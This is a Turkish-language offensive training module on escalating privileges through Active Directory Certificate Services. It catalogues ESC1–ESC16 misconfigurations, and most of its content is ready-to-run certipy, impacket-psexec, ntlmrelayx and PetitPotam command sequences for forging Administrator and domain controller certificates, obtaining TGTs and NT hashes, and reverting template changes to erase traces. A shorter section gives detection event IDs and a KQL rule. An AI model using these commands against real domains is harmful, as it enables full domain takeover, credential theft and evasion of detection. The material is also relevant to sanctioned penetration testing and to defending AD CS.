## 1. Genel Bakış ve PKI Güvenlik Mimarisi

Active Directory Certificate Services (AD CS), kurumsal ağlarda bilgisayarlar, kullanıcılar ve ağ servisleri için Genel Anahtar Altyapısı (PKI) sunan kritik bir Microsoft rolüdür. Bir sertifikanın Active Directory ortamında bir saldırgan için nihai hedef olmasının temel nedeni **PKINIT (RFC 4556 - Kerberos Initial Authentication via Public Key Cryptography)** protokolüdür:

> **Kerberos PKINIT sayesinde geçerli bir istemci kimlik doğrulama sertifikası (.pfx), doğrudan KDC'den bir Kerberos TGT (Ticket Granting Ticket) biletine dönüştürülebilir.**
> Sertifikanın "kime ait olduğunu" belirleyen alan **SAN (Subject Alternative Name)** özniteliğidir. Eğer şablon veya CA talep sahibinin SAN belirlemesine izin veriyorsa, sıradan bir kullanıcı `SAN: Administrator@corp.local` içeren bir sertifika alıp anında Domain Admin olabilir.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 AD CS VE PKINIT TABANLI YETKİ YÜKSELTME AKIŞI               │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
           [1. AD CS Keşfi ve Zafiyetli Şablon Tespiti]
           - LDAP ve RPC üzerinden CA ve şablon denetimi: certipy find
           - EKU (Client Auth / Any Purpose), Name Flag (ENROLLEE_SUPPLIES_SUBJECT)
                                      │
                                      ▼
           [2. Zafiyet Senaryosuna Göre Sertifika Talebi (ESC1-ESC16)]
           - ESC1: certipy req -template VulnerableTemplate -upn Administrator
           - ESC4: Şablon DACL düzenle ──▶ ESC1 yap ──▶ Sertifika al ──▶ Geri al
           - ESC8: Web Enrollment (/certsrv) HTTP NTLM Relay
                                      │
                                      ▼
           [3. PKINIT ile Kerberos TGT ve NT Hash Elde Etme]
           - certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
           - KDC sertifikayı NTAuthCertificates ile onaylar
           - TGT teslim edilir + UnPAC-the-Hash ile NT hash çözülür
                                      │
                                      ▼
           [4. Domain Hakimiyeti ve Kalıcılık]
           - Parola değişse dahi sertifika 1 yıl geçerlidir (Persistence)
           - Pass-the-Ticket veya Pass-the-Hash ile DC'ye erişim (Modül 04)
```

## 2. Kapsamlı ESC1 – ESC16 Zafiyet Kataloğu

SpecterOps araştırmacıları Will Schroeder ve Lee Christensen tarafından yayımlanan *"Certified Pre-Owned"* çalışması ve güvenlik topluluğunun katkılarıyla güncellenen zafiyet sınıfları:

| Zafiyet Kodu | Kök Neden ve Mekanizma | Gereksinimler ve Koşullar | Operasyonel Sömürü Etkisi |
|---|---|---|---|
| **ESC1** | Talep edenin serbestçe SAN belirleyebilmesi (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`). | Client Authentication EKU + Enroll izni. | **Kritik:** Doğrudan Domain Admin adına sertifika ve TGT alma. |
| **ESC2** | Şablonda `Any Purpose` EKU'su bulunması veya hiç EKU tanımlanmaması. | Any Purpose EKU veya Boş EKU + Enroll izni. | Her amaçla kullanılabilir; istemci kimlik doğrulamasına dönüştürülür. |
| **ESC3** | Şablonda `Certificate Request Agent` EKU'su tanımlı olması. | Enrollment Agent EKU + Enroll izni. | Başka kullanıcılar adına (`on-behalf-of`) sertifika talep etme yetkisi. |
| **ESC4** | Şablon nesnesi üzerinde hatalı yazma izni (`GenericAll`, `WriteProperty`). | Şablonda DACL yetkisi. | Şablonu geçici olarak ESC1'e çevirme, sertifika alma ve geri yükleme. |
| **ESC5** | `CN=Public Key Services` PKI nesnelerinde aşırı yetkili DACL. | PKI konteynerinde yazma izni. | CA konfigürasyonunu değiştirerek tüm PKI altyapısını ele geçirme. |
| **ESC6** | CA sunucusunda `EDITF_ATTRIBUTESUBJECTALTNAME2` bayrağının açık olması. | CA sunucu yapılandırması. | **Evrensel ESC1:** Şablonda SAN kapalı olsa bile CA gelen SAN'ı zorla kabul eder. |
| **ESC7** | CA nesnesi üzerinde `ManageCA` veya `ManageCertificates` yetkisi. | CA üzerinde DACL hakkı. | Reddedilen talepleri onaylama, modül yükleme veya ESC6 bayrağını açma. |
| **ESC8** | AD CS HTTP Web Enrollment (`/certsrv`) arayüzünün NTLM imzasız olması. | Web Enrollment kurulu CA. | **NTLM Relay:** DC makinesini HTTP'ye yönlendirip DC$ sertifikası alma. |
| **ESC9** | Şablonda `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile SID gizlenmesi. | KB5014754 uzantısız şablon. | UPN yazma yetkisi ile kurban hesabı admin yapıp sertifika çıkarma. |
| **ESC10** | Zayıf Sertifika Eşleme (`StrongCertificateBindingEnforcement = 0/1`). | DC kayıt defteri ayarı. | SID uzantısı olmadan eski UPN/altSecurityIdentities eşleme ile yetki yükseltme. |
| **ESC11** | ICPR (RPC) arayüzünde paket imzalama (`RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`) eksikliği. | RPC tabanlı kayıt arayüzü. | SMB koersiyonunun doğrudan RPC AD CS arayüzüne relay edilmesi. |
| **ESC12** | CA sunucusunda YubiHSM veya yerel shell erişimi bulunması. | CA yerel yönetici hakkı. | CA özel anahtarını (`certutil -backupKey`) veya HSM belleğini çalma. |
| **ESC13** | Şablonun özel bir İlke OID'si (Issuance Policy) ile evrensel gruba bağlanması. | OID-Group eşlemesi. | Sertifikayı alan her kullanıcının otomatik olarak ilgili gruba dahil olması. |
| **ESC14** | `altSecurityIdentities` özniteliğinde zayıf açık X.509 eşleme izni. | Kullanıcıda WriteProperty. | Kendi ürettiği sertifikayı hedef yöneticinin nesnesine bağlama. |
| **ESC15** | Şema v1 eski Windows 2000 dönemi şablonlarında EKU doğrulaması esnekliği. | Şema v1 şablon varlığı. | EKU kısıtlamalarını aşarak istemci kimlik doğrulamasına geçiş. |
| **ESC16** | Windows Server 2025 dMSA hesaplarının sertifika yetki zincirleri. | dMSA yapılandırması. | Delegated Managed Service Account kimlik doğrulamalarında yetki sıçraması. |

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: Certipy ile Etki Alanında Zafiyetli Şablon Keşfi
```bash
# Etki alanındaki tüm CA'ları ve ESC1-ESC16 zafiyetli şablonları tara
certipy find -u jdoe@corp.local -p 'Welcome123!' -dc-ip 10.10.10.5 -vulnerable -stdout
```

### Senaryo 2: ESC1 Sömürüsü (Administrator Adına Sertifika ve TGT)
```bash
# 1. Zafiyetli şablondan Administrator SAN'ı ile sertifika talep et
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' \
  -template 'UserAuthentication' -upn Administrator@corp.local -dc-ip 10.10.10.5

# 2. Üretilen administrator.pfx ile PKINIT üzerinden TGT ve NT hash al
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5

# 3. Alınan bilet ile Pass-the-Ticket yaparak DC'ye erişim sağla
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@10.10.10.5
```

### Senaryo 3: ESC4 Sömürüsü (Şablon DACL Manipülasyonu ve İz Temizliği)
```bash
# 1. Şablonu geçici olarak ESC1 uyumlu hale getir (orijinal konfigürasyonu kaydeder)
certipy template -u jdoe@corp.local -p 'Welcome123!' -template 'CustomWeb' \
  -save-old -write-default-configuration -dc-ip 10.10.10.5

# 2. ESC1 şablonundan yönetici sertifikası talep et
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' \
  -template 'CustomWeb' -upn Administrator@corp.local -dc-ip 10.10.10.5

# 3. İzi temizlemek için şablonu orijinal JSON yedeğinden eski haline döndür
certipy template -u jdoe@corp.local -p 'Welcome123!' -template 'CustomWeb' \
  -configuration CustomWeb.json -dc-ip 10.10.10.5
```

### Senaryo 4: ESC8 Sömürüsü (PetitPotam + Web Enrollment NTLM Relay)
```bash
# 1. ntlmrelayx dinleyicisini CA'nın HTTP web enrollment arayüzüne yönlendir
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support --template DomainController

# 2. PetitPotam ile Domain Controller'ı Kali saldırı makinesine zorla
petitpotam.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5

# 3. Relay tamamlandığında ntlmrelayx tarafından teslim edilen DC01$.pfx ile kimlik doğrula
certipy auth -pfx dc01$.pfx -dc-ip 10.10.10.5
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `KDC_ERR_PADATA_TYPE_NOSUPP` | Domain Controller PKINIT desteklemiyor; DC üzerinde geçerli bir KDC/DomainController sertifikası yok. | Başka bir DC'yi hedefleyin (`-dc-ip`) veya ortama KDC sertifikası dağıtılması için DC şablonlarını inceleyin. |
| `CERT_E_ROLE / E_ACCESSDENIED` | Talep eden kullanıcının hedef şablon üzerinde `Enroll` izni bulunmuyor. | `certipy find` çıktısında `Enrollment Rights` alanını denetleyin; `Authenticated Users` hakkı olan şablonları seçin. |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | Sertifikayı imzalayan CA, etki alanı `NTAuthCertificates` deposunda güvenilir kök olarak bulunmuyor. | Sertifikanın kurumsal etki alanı CA'sı tarafından imzalandığından emin olun; bağımsız (Standalone) CA'lar PKINIT kabul etmez. |
| `CERTSRV_E_ENROLL_DENIED` | Sertifika şablonunda `Manager Approval (Yönetici Onayı)` bayrağı aktif; talep beklemede kaldı. | Onay gerektirmeyen şablonları tercih edin veya ESC7 yetkiniz varsa `certipy ca -issue-request <ID>` ile onaylayın. |
| `KDC_ERR_CERTIFICATE_REVOKED` | Sertifika iptal listesinde (CRL) görünüyor veya CRL dağıtım noktasına (CDP) erişilemiyor. | CA CRL yayınlama periyodunu kontrol edin; ağda CDP erişiminin engellenmediğinden emin olun. |
| `StrongBinding / Bad Object SID` | KB5014754 yaması sonrası sertifikada SID uzantısı (`1.3.6.1.4.1.311.25.2`) yok ve DC güçlü eşleme zorunlu kılıyor. | ESC9/ESC10 vektörlerini deneyin veya `StrongCertificateBindingEnforcement` değerinin durumunu analiz edin. |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Event ID 4886 (Sertifika Talebi Alındı):** CA sunucusunda üretilir. `Requester` alanı (ör. `corp\jdoe`) ile talep edilen SAN (`Administrator@corp.local`) arasındaki tutarsızlık doğrudan ESC1 alarmıdır.
- **Event ID 4887 (Sertifika Verildi):** Sertifikanın başarıyla teslim edildiğini ve seri numarasını belgeler.
- **Event ID 4768 (Kerberos TGT Talebi):** PKINIT ile bilet alındığında `Pre-Authentication Type: 16` veya `17` ve sertifika parmak izi kaydedilir.
- **Event ID 4898 (Sertifika Şablonu Yüklendi / Değiştirildi):** ESC4 sömürüsü sırasında şablon öznitelikleri modifiye edildiğinde düşer.

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: AD CS Requester ile Subject Alternative Name (SAN) Tutarsızlığı Tespiti (ESC1)
SecurityEvent
| where EventID == 4887
| extend RequesterAccount = tostring(parse_json(ExtendedProperties).Requester)
| extend CertificateSAN = tostring(parse_json(ExtendedProperties).SubjectAlternativeName)
| where isnotempty(CertificateSAN) and CertificateSAN !contains RequesterAccount
| project TimeGenerated, Computer, RequesterAccount, CertificateSAN, CertificateTemplate
```

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Operasyonel Kullanım Aşaması |
|---|---|---|
| **T1649** | Steal or Forge Authentication Certificates | Zafiyetli şablonlardan yetkili sertifika talep etme ve PKINIT. |
| **T1558** | Steal or Forge Kerberos Tickets | Alınan sertifikayı TGT biletine dönüştürme. |
| **T1187** | Forced Authentication | PetitPotam ile DC'yi ESC8 Web Enrollment'a relay etme. |
| **T1078.002** | Valid Accounts: Domain Accounts | Sertifika ile meşru etki alanı yöneticisi kimliğine bürünme. |

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: Certipy ile Tüm Zafiyetli Şablonları Listeleme
```bash
certipy find -u jdoe@corp.local -p 'Welcome123!' -dc-ip 10.10.10.5 -vulnerable -stdout
```
- **Ne Yapar?** AD CS ortamındaki tüm sertifika şablonlarını tarar ve ESC1'den ESC16'ya kadar zafiyet barındıranları raporlar.
- **Ne Zaman Kullanılır?** İlk erişim sonrası AD CS saldırı vektörlerini haritalamak için.
- **Parametreler:** `-vulnerable`: Sadece zafiyetli olanları filtreler; `-stdout`: Çıktıyı doğrudan ekrana basar.

### Komut 2: Certipy ile ESC1 Sertifika Talebi (Administrator SAN)
```bash
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' -template 'UserAuth' -upn Administrator@corp.local -dc-ip 10.10.10.5
```
- **Ne Yapar?** ESC1 zafiyetli şablondan Administrator UPN'i ile özel anahtarlı bir `.pfx` sertifikası alır.
- **Ne Zaman Kullanılır?** Şablonda `ENROLLEE_SUPPLIES_SUBJECT` ve Client Authentication EKU'su tespit edildiğinde.
- **Parametreler:** `-ca`: Sertifika otoritesi adı; `-template`: Şablon adı; `-upn`: Taklit edilecek hesap.

### Komut 3: Alınan Sertifika ile PKINIT Oturumu Açma ve Hash Çözme
```bash
certipy auth -pfx Administrator.pfx -dc-ip 10.10.10.5
```
- **Ne Yapar?** PFX sertifikasını KDC'ye sunarak Kerberos TGT'si alır ve UnPAC-the-Hash ile açık NT hash'ini ekrana yazar.
- **Ne Zaman Kullanılır?** Sertifika elde edildikten hemen sonra TGT ve NT hash elde etmek için.
- **Parametreler:** `-pfx`: Sertifika dosyası; `-dc-ip`: Domain Controller adresi.

### Komut 4: Certipy ile ESC4 Şablonunu Geçici Olarak ESC1 Yapma
```bash
certipy template -u jdoe@corp.local -p 'Welcome123!' -template 'WebServers' -save-old -write-default-configuration -dc-ip 10.10.10.5
```
- **Ne Yapar?** Yazma izni olan şablonu orijinal halini kaydederek ESC1 zafiyetine sahip bir yapılandırmaya dönüştürür.
- **Ne Zaman Kullanılır?** Şablon nesnesi üzerinde `GenericAll` izni olduğunda.
- **Parametreler:** `-save-old`: Eski ayarları JSON olarak saklar; `-write-default-configuration`: ESC1 ayarlarını yazar.

### Komut 5: ESC4 Değişikliğini Geri Alma (İz Temizliği)
```bash
certipy template -u jdoe@corp.local -p 'Welcome123!' -template 'WebServers' -configuration WebServers.json -dc-ip 10.10.10.5
```
- **Ne Yapar?** Önceden modifiye edilen şablonu saklanan JSON dosyasındaki orijinal ayarlarına döndürür.
- **Ne Zaman Kullanılır?** Sertifika alındıktan sonra şablonu eski haline getirip IOC izini silmek için.
- **Parametreler:** `-configuration`: Geri yüklenecek JSON yedek dosyası.

### Komut 6: ESC8 için NTLM Relay Dinleyicisi Başlatma
```bash
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --template DomainController
```
- **Ne Yapar?** HTTP Web Enrollment servisine gelen NTLM oturumlarını relay ederek makine adına sertifika üretir.
- **Ne Zaman Kullanılır?** PetitPotam veya PrinterBug koersiyonu öncesi CA web arayüzünü hedeflemek için.
- **Parametreler:** `-t`: Web enrollment hedef URL'i; `--template`: Talep edilecek sertifika şablonu.
